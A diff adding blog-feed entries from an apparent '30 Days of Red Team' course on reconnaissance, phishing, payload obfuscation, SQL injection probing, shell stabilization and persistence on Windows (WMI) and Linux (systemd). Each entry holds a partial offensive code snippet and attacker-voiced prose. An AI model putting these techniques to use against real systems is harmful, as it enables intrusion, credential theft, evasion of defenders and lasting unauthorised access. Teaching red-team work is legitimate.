@@ -915,4 +915,598 @@ def beacon():
             ]]>
         </content>
     </entry>
+    <entry>
+        <title>30 Days of Red Team: Day 9 — Linux Persistence</title>
+        <author>
+            <name>Maxwell Cross</name>
+        </author>
+        <link href="https://maxwell-cross.com/30-days-red-team-day-9.html"/>
+        <id>https://maxwell-cross.com/30-days-red-team-day-9.html</id>
+
+        <updated>2025-11-24T18:23:00-05:00</updated>
+            <summary type="html">
+                <![CDATA[
+                    Windows has the Registry. Linux has Everything Else. Yesterday, we hid inside the Windows Registry. Today, we enter the world of Linux, where "everything is a file"—including your malware. If you think Linux persistence is just adding a Cron job and calling it a day,&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                <h4 data-path-to-node="10"><strong data-path-to-node="10" data-index-in-node="0">Windows has the Registry. Linux has Everything Else.</strong></h4>
+<p data-path-to-node="11">Yesterday, we hid inside the Windows Registry. Today, we enter the world of Linux, where "everything is a file"—including your malware.</p>
+<p data-path-to-node="12">If you think Linux persistence is just adding a Cron job and calling it a day, you are going to get caught. Modern Linux environments (especially in the cloud) are heavily monitored. To survive reboots and <code data-path-to-node="12" data-index-in-node="206">rm -rf</code> commands, you need to understand the boot process better than the sysadmin does.</p>
+<p data-path-to-node="13">Today, we cover the art of staying root.</p>
+<hr>
+<h3 data-path-to-node="15"><strong data-path-to-node="15" data-index-in-node="0">A Glimpse of the Code: Systemd Persistence</strong></h3>
+<p data-path-to-node="16">Cron is noisy. <strong data-path-to-node="16" data-index-in-node="15">Systemd</strong> is professional.</p>
+<p data-path-to-node="17">Systemd manages services on almost every modern Linux distro. By creating a custom user service, we can ensure our payload restarts automatically if it crashes or is killed. Here is the logic from the <strong data-path-to-node="17" data-index-in-node="201">Systemd Persistence Tool</strong> we build in the full article:</p>
+<pre class="language-python"><code>def create_user_service(service_name, payload_command):
+    """
+    Create a systemd user service that survives reboots (no root required).
+    """
+    service_content = f"""[Unit]
+Description=User background synchronization service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c '{payload_command}'
+Restart=always
+RestartSec=30
+
+[Install]
+WantedBy=default.target
+"""
+    # Write to ~/.config/systemd/user/ and enable lingering
+    # "Lingering" ensures the service runs even when the user is logged out.
+    subprocess.run(f'loginctl enable-linger {os.getenv("USER")}', shell=True)</code></pre>
+<p>This technique allows your persistence to survive even when the user logs out, effectively turning a low-privilege user account into a permanent foothold.</p>
+<hr>
+<h4 data-path-to-node="21"><strong data-path-to-node="21" data-index-in-node="0">Read the full guide on Medium to get:</strong></h4>
+<ul data-path-to-node="22">
+<li>
+<p data-path-to-node="22,0,0"><strong data-path-to-node="22,0,0" data-index-in-node="0">The Cron Framework:</strong> How to install stealthy Cron jobs that blend in with system tasks (and how to hide them from casual inspection).</p>
+</li>
+<li>
+<p data-path-to-node="22,1,0"><strong data-path-to-node="22,1,0" data-index-in-node="0">SSH Key Injection:</strong> A script to generate backdoor SSH keys and inject them into <code data-path-to-node="22,1,0" data-index-in-node="80">authorized_keys</code> without leaving a command history trail.</p>
+</li>
+<li>
+<p data-path-to-node="22,2,0"><strong data-path-to-node="22,2,0" data-index-in-node="0">Shell Profile Poisoning:</strong> How to modify <code data-path-to-node="22,2,0" data-index-in-node="39">.bashrc</code> and <code data-path-to-node="22,2,0" data-index-in-node="51">.profile</code> so your payload executes every time an admin logs in to check the server.</p>
+</li>
+<li>
+<p data-path-to-node="22,3,0"><strong data-path-to-node="22,3,0" data-index-in-node="0">The Master Linux Framework:</strong> A Python tool that detects your privileges (Root vs. User) and automatically installs the best available persistence method.</p>
+</li>
+</ul>
+<p data-path-to-node="23">We own the server. Now, let's make sure we keep it.</p>
+<p data-path-to-node="23"><a href="https://medium.com/30-days-of-red-team/30-days-of-red-team-day-9-linux-persistence-techniques-surviving-in-unix-territory-d654252c61c5" target="_blank" rel="noopener noreferrer">READ THE FULL GUIDE ON MEDIUM ➔</a></p>
+            ]]>
+        </content>
+    </entry>
+    <entry>
+        <title>30 Days of Red Team: Day 8 — Windows Persistence</title>
+        <author>
+            <name>Maxwell Cross</name>
+        </author>
+        <link href="https://maxwell-cross.com/30-days-red-team-day-8.html"/>
+        <id>https://maxwell-cross.com/30-days-red-team-day-8.html</id>
+
+        <updated>2025-11-19T18:20:00-05:00</updated>
+            <summary type="html">
+                <![CDATA[
+                    Getting in is hard. Getting locked out is easy. You spent Week 1 learning how to hack. You reconned the target, weaponized a payload, and popped a shell. You feel like a genius. Then the user reboots their computer. Your connection dies. Your shell is&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                <h4 data-path-to-node="10"><strong data-path-to-node="10" data-index-in-node="0">Getting in is hard. Getting locked out is easy.</strong></h4>
+<p data-path-to-node="11">You spent Week 1 learning how to hack. You reconned the target, weaponized a payload, and popped a shell. You feel like a genius.</p>
+<p data-path-to-node="12">Then the user reboots their computer.</p>
+<p data-path-to-node="13">Your connection dies. Your shell is gone. And because you didn't establish <strong data-path-to-node="13" data-index-in-node="75">Persistence</strong>, you have to start over from scratch.</p>
+<p data-path-to-node="14">Today, we begin Week 2 by ensuring that never happens. We are building the tools to survive reboots, logoffs, and even active hunting by the Blue Team.</p>
+<hr>
+<h4 data-path-to-node="16"><strong data-path-to-node="16" data-index-in-node="0">A Glimpse of the Code: WMI Event Subscriptions</strong></h4>
+<p data-path-to-node="17">Amateurs put a batch file in the Startup folder. Professionals use <strong data-path-to-node="17" data-index-in-node="67">WMI</strong>.</p>
+<p data-path-to-node="18">Windows Management Instrumentation (WMI) allows us to create "fileless" persistence that never touches the disk and doesn't show up in the Registry. Here is the core logic for binding a malicious payload to a system event:</p>
+<pre class="language-python"><code>def create_wmi_persistence(self, payload_command, event_name):
+    """
+    Creates WMI event subscription for stealthy persistence.
+    1. Filter: Defines WHEN to trigger (e.g., system uptime &gt; 2 min)
+    2. Consumer: Defines WHAT to run (our payload)
+    3. Binding: Connects them together
+    """
+    ps_script = f'''
+    # 1. Event Filter
+    $FilterArgs = @{{
+        name='_{event_name}_Filter';
+        EventNameSpace='root\\CimV2';
+        Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 
+               WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+    }};
+    
+    # 2. Event Consumer
+    $ConsumerArgs = @{{
+        name='_{event_name}_Consumer';
+        CommandLineTemplate="{payload_command}"
+    }};
+    
+    # 3. Binding
+    New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding ...
+    '''
+    return ps_script</code></pre>
+<p>This script buries your access deep within the Windows operating system, making it incredibly difficult to detect without specialized forensic tools.</p>
+<hr>
+<h4 data-path-to-node="22"><strong data-path-to-node="22" data-index-in-node="0">Read the full guide on Medium to get:</strong></h4>
+<ul data-path-to-node="23">
+<li>
+<p data-path-to-node="23,0,0"><strong data-path-to-node="23,0,0" data-index-in-node="0">The Registry Framework:</strong> 8 different methods to hook into the Windows Registry, including "Image File Execution Options" (IFEO) hijacking.</p>
+</li>
+<li>
+<p data-path-to-node="23,1,0"><strong data-path-to-node="23,1,0" data-index-in-node="0">Smart Scheduled Tasks:</strong> How to create tasks that trigger not just on time, but on specific events like <strong data-path-to-node="23,1,0" data-index-in-node="102">User Logon</strong> or <strong data-path-to-node="23,1,0" data-index-in-node="116">System Idle</strong>.</p>
+</li>
+<li>
+<p data-path-to-node="23,2,0"><strong data-path-to-node="23,2,0" data-index-in-node="0">Service Wrapper:</strong> A tool to run your malware as a legitimate background service with SYSTEM privileges.</p>
+</li>
+<li>
+<p data-path-to-node="23,3,0"><strong data-path-to-node="23,3,0" data-index-in-node="0">The Master Persistence Script:</strong> A "Nuclear Option" script that installs 7 layers of persistence simultaneously to guarantee you never lose access.</p>
+</li>
+</ul>
+<p data-path-to-node="24">The Golden Rule of Persistence: Always establish two doors. Today, we build them.</p>
+<p data-path-to-node="24"><a href="https://medium.com/30-days-of-red-team/30-days-of-red-team-day-8-windows-persistence-mechanisms-bee31a6ba75d" target="_blank" rel="noopener noreferrer">READ THE FULL GUIDE ON MEDIUM ➔</a></p>
+            ]]>
+        </content>
+    </entry>
+    <entry>
+        <title>30 Days of Red Team: Day 7 — The Master Framework</title>
+        <author>
+            <name>Maxwell Cross</name>
+        </author>
+        <link href="https://maxwell-cross.com/30-days-red-team-day-7.html"/>
+        <id>https://maxwell-cross.com/30-days-red-team-day-7.html</id>
+
+        <updated>2025-11-18T18:17:00-05:00</updated>
+            <summary type="html">
+                <![CDATA[
+                    A collection of scripts doesn't make you dangerous. For six days, you have been building individual tools: a port scanner here, a payload generator there. But professional Red Teaming isn't about running random scripts. It's about Orchestration. Today, we take every tool we built in&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                <h4 data-path-to-node="10"><strong data-path-to-node="10" data-index-in-node="0">A collection of scripts doesn't make you dangerous.</strong></h4>
+<p data-path-to-node="11">For six days, you have been building individual tools: a port scanner here, a payload generator there. But professional Red Teaming isn't about running random scripts. It's about <strong data-path-to-node="11" data-index-in-node="179">Orchestration</strong>.</p>
+<p data-path-to-node="12">Today, we take every tool we built in Week 1—from Reconnaissance to Post-Exploitation—and fuse them into a single, automated attack engine.</p>
+<p data-path-to-node="13">We are moving from "I have a tool" to "I have a campaign."</p>
+<hr>
+<h4 data-path-to-node="15"><strong data-path-to-node="15" data-index-in-node="0">A Glimpse of the Code: The Automation Engine</strong></h4>
+<p data-path-to-node="16">Manual hacking is slow and prone to error. In Day 7, we write the logic that chains our tools together automatically.</p>
+<p data-path-to-node="17">Here is the <code data-path-to-node="17" data-index-in-node="12">run_full_engagement</code> method from our <strong data-path-to-node="17" data-index-in-node="48">Master Framework</strong>. It executes the entire Cyber Kill Chain with a single command:</p>
+<pre class="language-python"><code>def run_full_engagement(self):
+    """Execute complete engagement workflow"""
+    phases = [
+        ('Phase 1: Reconnaissance', self.phase_1_reconnaissance),
+        ('Phase 2: Weaponization', self.phase_2_weaponization),
+        ('Phase 3: Delivery', self.phase_3_delivery),
+        ('Phase 4: Exploitation', self.phase_4_exploitation),
+        ('Phase 5: Post-Exploitation', self.phase_5_post_exploitation)
+    ]
+    
+    for phase_name, phase_func in phases:
+        self.log(f"Starting {phase_name}...")
+        phase_func()
+        
+        # Configurable delay to evade behavioral detection
+        if self.config['options'].get('delay_between_phases', 0) &gt; 0:
+            time.sleep(self.config['options']['delay_between_phases'])</code></pre>
+<p>This script allows you to launch a standardized attack campaign against a target while you sit back and analyze the incoming data.</p>
+<hr>
+<h4 data-path-to-node="21"><strong data-path-to-node="21" data-index-in-node="0">Read the full guide on Medium to get:</strong></h4>
+<ul data-path-to-node="22">
+<li>
+<p data-path-to-node="22,0,0"><strong data-path-to-node="22,0,0" data-index-in-node="0">The Master Framework:</strong> A unified Python script that orchestrates your Recon, Weaponization, and Exploitation tools.</p>
+</li>
+<li>
+<p data-path-to-node="22,1,0"><strong data-path-to-node="22,1,0" data-index-in-node="0">Attack Chain Templates:</strong> Pre-built workflows for common scenarios (e.g., "Web App Takeover," "Domain Compromise").</p>
+</li>
+<li>
+<p data-path-to-node="22,2,0"><strong data-path-to-node="22,2,0" data-index-in-node="0">The Week 1 CTF:</strong> A custom Capture-The-Flag challenge I built to test your new skills (6 flags, 100 points).</p>
+</li>
+<li>
+<p data-path-to-node="22,3,0"><strong data-path-to-node="22,3,0" data-index-in-node="0">The "Production-Ready" Checklist:</strong> How to clean, document, and organize your code so you can use it on real client engagements next week.</p>
+</li>
+</ul>
+<p data-path-to-node="23">Week 1 is complete. You have the toolkit. Now, prove you can use it.</p>
+<p data-path-to-node="23"><a href="https://medium.com/30-days-of-red-team/30-days-of-red-team-day-7-week-1-integration-practice-4840f85389a3" target="_blank" rel="noopener noreferrer">READ THE FULL GUIDE ON MEDIUM ➔</a></p>
+            ]]>
+        </content>
+    </entry>
+    <entry>
+        <title>30 Days of Red Team: Day 6 — Post-Exploitation</title>
+        <author>
+            <name>Maxwell Cross</name>
+        </author>
+        <link href="https://maxwell-cross.com/30-days-red-team-day-6.html"/>
+        <id>https://maxwell-cross.com/30-days-red-team-day-6.html</id>
+
+        <updated>2025-11-02T10:24:00-05:00</updated>
+            <summary type="html">
+                <![CDATA[
+                    Getting in is easy. Staying in is hard. Yesterday, you gained your first foothold. But this is the moment where most attacks fail. The difference between a professional Red Teamer and a script kiddie isn't the exploit they used—it's what happens in the first 15&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                <h4 data-path-to-node="10"><strong data-path-to-node="10" data-index-in-node="0">Getting in is easy. Staying in is hard.</strong></h4>
+<p data-path-to-node="11">Yesterday, you gained your first foothold. But this is the moment where most attacks fail.</p>
+<p data-path-to-node="12">The difference between a professional Red Teamer and a script kiddie isn't the exploit they used—it's what happens in the first 15 minutes <i data-path-to-node="12" data-index-in-node="139">after</i> the shell pops. Do you panic and run loud commands? Or do you methodically map your surroundings?</p>
+<p data-path-to-node="13">Today, we cover <strong data-path-to-node="13" data-index-in-node="16">Situational Awareness</strong>: the art of understanding where you are, what you control, and how to move deeper without tripping every alarm in the SOC.</p>
+<hr>
+<h3 data-path-to-node="15"><strong data-path-to-node="15" data-index-in-node="0">A Glimpse of the Code: Shell Stabilization</strong></h3>
+<p data-path-to-node="16">We've all been there: you get a reverse shell, you type <code data-path-to-node="16" data-index-in-node="56">Ctrl+C</code> to stop a command, and you accidentally kill your own connection.</p>
+<p data-path-to-node="17">In Day 6, we build a <strong data-path-to-node="17" data-index-in-node="21">Shell Stabilizer</strong> that automatically upgrades "dumb" shells into fully interactive TTY sessions. Here is the Python logic that saves your session:</p>
+<pre class="language-python"><code>def linux_stabilization(self):
+    """
+    The 'Python PTY' trick to stabilize a reverse shell.
+    Run this inside your victim shell to get a proper terminal.
+    """
+    commands = [
+        # Spawns a pseudo-terminal (PTY) so tools like 'su' and 'sudo' work
+        'python3 -c \'import pty; pty.spawn("/bin/bash")\'',
+        
+        # Background the shell (Ctrl+Z), then run this on your machine:
+        'stty raw -echo; fg',
+        
+        # Reset the terminal to fix formatting
+        'export TERM=xterm'
+    ]
+    return commands</code></pre>
+<p>This simple technique gives you tab completion, command history, and the ability to run interactive tools like <code data-path-to-node="19" data-index-in-node="111">vim</code> or <code data-path-to-node="19" data-index-in-node="118">nano</code> on the victim machine.</p>
+<hr>
+<h4 data-path-to-node="21"><strong data-path-to-node="21" data-index-in-node="0">Read the full guide on Medium to get:</strong></h4>
+<ul data-path-to-node="22">
+<li>
+<p data-path-to-node="22,0,0"><strong data-path-to-node="22,0,0" data-index-in-node="0">The Situational Awareness Tool:</strong> An automated script that fingerprints the OS, checks for EDR/AV, and lists accessible privileges in seconds.</p>
+</li>
+<li>
+<p data-path-to-node="22,1,0"><strong data-path-to-node="22,1,0" data-index-in-node="0">The Credential Harvester:</strong> A regex-powered tool that scrapes passwords from <code data-path-to-node="22,1,0" data-index-in-node="76">bash_history</code>, config files, and environment variables.</p>
+</li>
+<li>
+<p data-path-to-node="22,2,0"><strong data-path-to-node="22,2,0" data-index-in-node="0">Network Discovery:</strong> How to map the internal network and find Lateral Movement targets (like Domain Controllers) from your initial beachhead.</p>
+</li>
+<li>
+<p data-path-to-node="22,3,0"><strong data-path-to-node="22,3,0" data-index-in-node="0">Data Exfiltration Helper:</strong> A stealthy way to move sensitive files out of the network using encrypted HTTP, Netcat, or ICMP covert channels.</p>
+</li>
+</ul>
+<p data-path-to-node="23">You are inside. Now, let's look around.</p>
+<p data-path-to-node="23"><a href="https://medium.com/30-days-of-red-team/30-days-of-red-team-day-6-post-exploitation-youre-in-now-what-254b09f2688e" target="_blank" rel="noopener noreferrer">READ THE FULL GUIDE ON MEDIUM ➔</a></p>
+            ]]>
+        </content>
+    </entry>
+    <entry>
+        <title>30 Days of Red Team: Day 5 — Initial Exploitation</title>
+        <author>
+            <name>Maxwell Cross</name>
+        </author>
+        <link href="https://maxwell-cross.com/30-days-red-team-day-5.html"/>
+        <id>https://maxwell-cross.com/30-days-red-team-day-5.html</id>
+
+        <updated>2025-10-30T10:20:00-04:00</updated>
+            <summary type="html">
+                <![CDATA[
+                    Reconnaissance is over. Theory becomes reality. For four days, you’ve been gathering intelligence, building weapons, and mapping attack surfaces. You’ve been patient. Today, we cross the line from external observer to internal operator. Initial Exploitation is the moment where all your preparation converges into a&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                <h4 data-path-to-node="10"><strong data-path-to-node="10" data-index-in-node="0">Reconnaissance is over. Theory becomes reality.</strong></h4>
+<p data-path-to-node="11">For four days, you’ve been gathering intelligence, building weapons, and mapping attack surfaces. You’ve been patient.</p>
+<p data-path-to-node="12">Today, we cross the line from external observer to internal operator.</p>
+<p data-path-to-node="13"><strong data-path-to-node="13" data-index-in-node="0">Initial Exploitation</strong> is the moment where all your preparation converges into a single objective: getting that first foothold inside the target network. It’s not about finding zero-days; it’s about efficiently leveraging the vulnerabilities you found in Recon to break down the door.</p>
+<hr>
+<h3 data-path-to-node="15"><strong data-path-to-node="15" data-index-in-node="0">A Glimpse of the Code: Smart Vulnerability Detection</strong></h3>
+<p data-path-to-node="16">Throwing payloads blindly is loud and amateur. Smart tools verify vulnerabilities by analyzing how the server <i data-path-to-node="16" data-index-in-node="110">breaks</i>.</p>
+<p data-path-to-node="17">Here is the core logic from the <strong data-path-to-node="17" data-index-in-node="32">Automated Vuln Scanner</strong> we build in the full article, designed to confirm SQL Injection without triggering every alarm in the building:</p>
+<pre class="language-python"><code>def check_sql_injection(self, url):
+    """Test for SQL injection vulnerabilities"""
+    payloads = [
+        "'",
+        "' OR '1'='1",
+        "admin'--"
+    ]
+    
+    # SQL error patterns that confirm vulnerability
+    sql_errors = [
+        'SQL syntax.*MySQL',
+        'Warning.*mysql_.*',
+        'PostgreSQL.*ERROR',
+        'OLE DB.*SQL Server'
+    ]
+    
+    for payload in payloads:
+        response = self.session.get(url, params={'id': payload})
+        
+        for error_pattern in sql_errors:
+            if re.search(error_pattern, response.text, re.IGNORECASE):
+                return {
+                    'type': 'SQL Injection',
+                    'severity': 'CRITICAL',
+                    'payload': payload
+                }
+    return None</code></pre>
+<p>This script automates the tedious work, letting you focus on the fun part: popping the shell.</p>
+<hr>
+<h4 data-path-to-node="21"><strong data-path-to-node="21" data-index-in-node="0">Read the full guide on Medium to get:</strong></h4>
+<ul data-path-to-node="22">
+<li>
+<p data-path-to-node="22,0,0"><strong data-path-to-node="22,0,0" data-index-in-node="0">The Web Shell Uploader:</strong> A tool that bypasses file upload filters using double extensions (<code data-path-to-node="22,0,0" data-index-in-node="90">shell.php.jpg</code>) and MIME type spoofing.</p>
+</li>
+<li>
+<p data-path-to-node="22,1,0"><strong data-path-to-node="22,1,0" data-index-in-node="0">The Shell Stabilizer:</strong> A handler that automatically upgrades your fragile netcat connection into a fully interactive PTY shell (so <code data-path-to-node="22,1,0" data-index-in-node="131">Ctrl+C</code> doesn't kill your session).</p>
+</li>
+<li>
+<p data-path-to-node="22,2,0"><strong data-path-to-node="22,2,0" data-index-in-node="0">Service Exploitation Framework:</strong> How to automate attacks against SSH, FTP, and SMB using the credentials you harvested in Day 4.</p>
+</li>
+<li>
+<p data-path-to-node="22,3,0"><strong data-path-to-node="22,3,0" data-index-in-node="0">The "First Foothold":</strong> A complete playbook for turning a single vulnerability into stable system access.</p>
+</li>
+</ul>
+<p data-path-to-node="23">We are inside the network. Tomorrow, we find out just how deep the rabbit hole goes.</p>
+<p data-path-to-node="23"><a href="https://medium.com/30-days-of-red-team/30-days-of-red-team-day-5-initial-exploitation-techniques-from-shell-to-system-access-fbb73d60dc27" target="_blank" rel="noopener noreferrer">READ THE FULL GUIDE ON MEDIUM ➔</a></p>
+            ]]>
+        </content>
+    </entry>
+    <entry>
+        <title>30 Days of Red Team: Day 4 — Social Engineering &amp; Delivery</title>
+        <author>
+            <name>Maxwell Cross</name>
+        </author>
+        <link href="https://maxwell-cross.com/30-days-red-team-day-4.html"/>
+        <id>https://maxwell-cross.com/30-days-red-team-day-4.html</id>
+
+        <updated>2025-10-29T10:14:00-04:00</updated>
+            <summary type="html">
+                <![CDATA[
+                    The best payload in the world is useless if you can’t convince someone to run it. You have spent three days building an arsenal. You have the Recon. You have the Weapons. But here is the uncomfortable truth: Technical skills don't matter if you can't&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                <h4 data-path-to-node="10"><strong data-path-to-node="10" data-index-in-node="0">The best payload in the world is useless if you can’t convince someone to run it.</strong></h4>
+<p data-path-to-node="11">You have spent three days building an arsenal. You have the Recon. You have the Weapons. But here is the uncomfortable truth: <strong data-path-to-node="11" data-index-in-node="126">Technical skills don't matter if you can't hack the human.</strong></p>
+<p data-path-to-node="12">Today, we dive into the psychology of deception. We aren't sending generic spam; we are building a targeted infrastructure that tracks every move our target makes.</p>
+<hr>
+<h3 data-path-to-node="14"><strong data-path-to-node="14" data-index-in-node="0">A Glimpse of the Code: The Phishing Backend</strong></h3>
+<p data-path-to-node="15">We don't just send emails and hope. We track.</p>
+<p data-path-to-node="16">We need to know exactly <i data-path-to-node="16" data-index-in-node="24">who</i> opened the email, <i data-path-to-node="16" data-index-in-node="46">when</i> they clicked the link, and <i data-path-to-node="16" data-index-in-node="78">which</i> department is the most vulnerable. Here is the core tracking logic from the <strong data-path-to-node="16" data-index-in-node="160">Phishing Framework</strong> we build in the full article:</p>
+<pre class="language-python"><code>class PhishingFramework:
+    def __init__(self, config_file='phishing_config.json'):
+        self.config = self.load_config(config_file)
+        self.db = self.init_database()
+    
+    def generate_token(self, length=16):
+        """Generate unique tracking token for each target"""
+        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
+    
+    def generate_tracking_pixel(self, token):
+        """Generate invisible 1x1 pixel to track email opens"""
+        # This pixel loads when the email is opened, alerting our C2
+        tracking_url = f"{self.config['tracking_domain']}/track/{token}.png"
+        return f'&lt;img src="{tracking_url}" width="1" height="1" style="display:none" /&gt;'</code></pre>
+<p>This snippet generates a unique digital fingerprint for every target. The moment they open that email, we know. And the moment they click, we own them.</p>
+<hr>
+<h4 data-path-to-node="20"><strong data-path-to-node="20" data-index-in-node="0">Read the full guide on Medium to get:</strong></h4>
+<ul data-path-to-node="21">
+<li>
+<p data-path-to-node="21,0,0"><strong data-path-to-node="21,0,0" data-index-in-node="0">The Psychology of Deception:</strong> How to use Cialdini’s 6 Principles of Influence to craft emails that are psychologically impossible to ignore.</p>
+</li>
+<li>
+<p data-path-to-node="21,1,0"><strong data-path-to-node="21,1,0" data-index-in-node="0">The Attachment Weaponizer:</strong> A tool to create <strong data-path-to-node="21,1,0" data-index-in-node="45">HTML Smuggling</strong> attachments that bypass email gateways by assembling the malware inside the victim's browser.</p>
+</li>
+<li>
+<p data-path-to-node="21,2,0"><strong data-path-to-node="21,2,0" data-index-in-node="0">Domain Reputation Strategy:</strong> How to warm up a new domain so your phishing emails land in the "Focused" inbox, not Spam.</p>
+</li>
+<li>
+<p data-path-to-node="21,3,0"><strong data-path-to-node="21,3,0" data-index-in-node="0">The "Perfect" Pretext:</strong> Using your Day 1 &amp; 2 Recon data to write the ultimate targeted email (e.g., "AWS Cost Review" for the DevOps team).</p>
+</li>
+</ul>
+<p data-path-to-node="22">We have built the gun. We have aimed it. Now, we pull the trigger.</p>
+<p data-path-to-node="22"><a href="https://medium.com/30-days-of-red-team/30-days-of-red-team-day-4-delivery-social-engineering-phishing-infrastructure-4d46f27cbd35" target="_blank" rel="noopener noreferrer">READ THE FULL GUIDE ON MEDIUM ➔</a></p>
+            ]]>
+        </content>
+    </entry>
+    <entry>
+        <title>30 Days of Red Team: Day 3 — Weaponization &amp; Evasion</title>
+        <author>
+            <name>Maxwell Cross</name>
+        </author>
+        <link href="https://maxwell-cross.com/30-days-red-team-day-3.html"/>
+        <id>https://maxwell-cross.com/30-days-red-team-day-3.html</id>
+
+        <updated>2025-10-28T09:53:00-04:00</updated>
+            <summary type="html">
+                <![CDATA[
+                    Today, we cross the line into active operations. Days 1 and 2 were passive. Safe. Legal. Today, we start building weapons. Not script kiddie trash that gets caught by Windows Defender in milliseconds. We are building sophisticated, targeted payloads designed to bypass Endpoint Detection &amp;&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                <h4 data-path-to-node="11"><strong data-path-to-node="11" data-index-in-node="0">Today, we cross the line into active operations.</strong></h4>
+<p data-path-to-node="12">Days 1 and 2 were passive. Safe. Legal. Today, we start building weapons.</p>
+<p data-path-to-node="13">Not script kiddie trash that gets caught by Windows Defender in milliseconds. We are building sophisticated, targeted payloads designed to bypass <strong data-path-to-node="13" data-index-in-node="146">Endpoint Detection &amp; Response (EDR)</strong> systems.</p>
+<p data-path-to-node="14">If you don't understand how your enemy thinks, you cannot evade them. Today, we deconstruct modern antivirus engines and build the code that defeats them.</p>
+<hr>
+<h3 data-path-to-node="16"><strong data-path-to-node="16" data-index-in-node="0">A Glimpse of the Code: Advanced Obfuscation</strong></h3>
+<p data-path-to-node="17">Generating a reverse shell is easy. Keeping it hidden is hard.</p>
+<p data-path-to-node="18">Standard payloads fail because they use known signatures. To survive, we need to mutate the code. Here is a snippet from the <strong data-path-to-node="18" data-index-in-node="125">Advanced Obfuscator</strong> we build in the full article:</p>
+<pre class="language-python"><code>def obfuscate_powershell_advanced(self, code):
+    """
+    Advanced PowerShell obfuscation with multiple techniques
+    """
+    # Technique 1: Variable name randomization
+    var_mapping = {
+        '$client': f'${self.generate_random_string()}',
+        '$stream': f'${self.generate_random_string()}',
+        '$bytes': f'${self.generate_random_string()}'
+    }
+    
+    obf_code = code
+    for old_var, new_var in var_mapping.items():
+        obf_code = obf_code.replace(old_var, new_var)
+    
+    # Technique 2: String concatenation to break signatures
+    obf_code = self.obfuscate_strings(obf_code)
+    
+    # Technique 3: Command case variation (NeW-OBJEcT)
+    for cmd in ['New-Object', 'Out-String']:
+        if cmd in obf_code:
+            obf_code = obf_code.replace(cmd, self.random_case(cmd))
+            
+    return obf_code</code></pre>
+<p>This script doesn't just encrypt the payload; it rewrites the DNA of the attack so that no two payloads ever look the same.</p>
+<hr>
+<h4 data-path-to-node="22"><strong data-path-to-node="22" data-index-in-node="0">Read the full guide on Medium to get:</strong></h4>
+<ul data-path-to-node="23">
+<li>
+<p data-path-to-node="23,0,0"><strong data-path-to-node="23,0,0" data-index-in-node="0">The Multi-Format Generator:</strong> A tool to instantly create payloads for PowerShell, Python, Bash, HTA, and VBA Macros.</p>
+</li>
+<li>
+<p data-path-to-node="23,1,0"><strong data-path-to-node="23,1,0" data-index-in-node="0">The Shellcode Loader:</strong> A C# template that uses direct system calls (<code data-path-to-node="23,1,0" data-index-in-node="68">VirtualAlloc</code>) to inject shellcode into memory, bypassing disk scans entirely.</p>
+</li>
+<li>
+<p data-path-to-node="23,2,0"><strong data-path-to-node="23,2,0" data-index-in-node="0">The Evasion Checklist:</strong> A step-by-step guide to defeating Signature, Heuristic, and Behavioral detection engines.</p>
+</li>
+<li>
+<p data-path-to-node="23,3,0"><strong data-path-to-node="23,3,0" data-index-in-node="0">The "Master Repository":</strong> A complete folder structure to organize your Red Team arsenal for the next 27 days.</p>
+</li>
+</ul>
+<p data-path-to-node="24">We are building the gun. Tomorrow, we learn how to aim it.</p>
+<p data-path-to-node="24"><a href="https://medium.com/30-days-of-red-team/30-days-of-red-team-day-3-weaponization-building-payloads-that-evade-detection-6268da00344e" target="_blank" rel="noopener noreferrer">READ THE FULL GUIDE ON MEDIUM <strong data-path-to-node="25" data-index-in-node="2">➔</strong></a></p>
+            ]]>
+        </content>
+    </entry>
+    <entry>
+        <title>30 Days of Red Team: Day 2 — Weaponizing OSINT</title>
+        <author>
+            <name>Maxwell Cross</name>
+        </author>
+        <link href="https://maxwell-cross.com/30-days-red-team-day-2.html"/>
+        <id>https://maxwell-cross.com/30-days-red-team-day-2.html</id>
+
+        <updated>2025-10-27T12:35:00-04:00</updated>
+            <summary type="html">
+                <![CDATA[
+                    If Day 1 was learning to walk, Day 2 is learning to run. Most defenders focus on firewalls and intrusion detection systems. But attackers? We are building detailed maps of their infrastructure using nothing but public information. Open Source Intelligence (OSINT) is the art of&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                <h4 data-path-to-node="11"><strong data-path-to-node="11" data-index-in-node="0">If Day 1 was learning to walk, Day 2 is learning to run.</strong></h4>
+<p data-path-to-node="12">Most defenders focus on firewalls and intrusion detection systems. But attackers? We are building detailed maps of their infrastructure using nothing but public information.</p>
+<p data-path-to-node="13"><strong data-path-to-node="13" data-index-in-node="0">Open Source Intelligence (OSINT)</strong> is the art of finding the data companies don't even realize they are exposing.</p>
+<p data-path-to-node="14">Every time a company posts a job listing, updates their SSL certificate, or pushes code to GitHub, they are handing us ammunition. Today, we automate the process of collecting it.</p>
+<hr>
+<h4 data-path-to-node="16"><strong data-path-to-node="16" data-index-in-node="0">A Glimpse of the Code: Automated Google Dorking</strong></h4>
+<p data-path-to-node="17">Google is the most powerful hacking tool ever created, but manual searching is too slow. In Day 2, we build a tool to automate "Dorking"—using search operators to find sensitive files.</p>
+<p data-path-to-node="18">Here is the core logic from the <strong data-path-to-node="18" data-index-in-node="32">Auto-Dorker</strong> we build in the full article:</p>
+<pre class="language-python"><code>def build_dork(self, dork_type):
+    """
+    Build targeted queries for different reconnaissance objectives
+    """
+    dorks = {
+        'subdomains': f'site:*.{self.domain} -site:www.{self.domain}',
+        'files': f'site:{self.domain} (ext:pdf OR ext:doc OR ext:xls)',
+        'logins': f'site:{self.domain} (inurl:login OR inurl:admin)',
+        'configs': f'site:{self.domain} (ext:xml OR ext:conf OR ext:cfg)',
+        'backup_files': f'site:{self.domain} (ext:bkf OR ext:bak OR ext:old)',
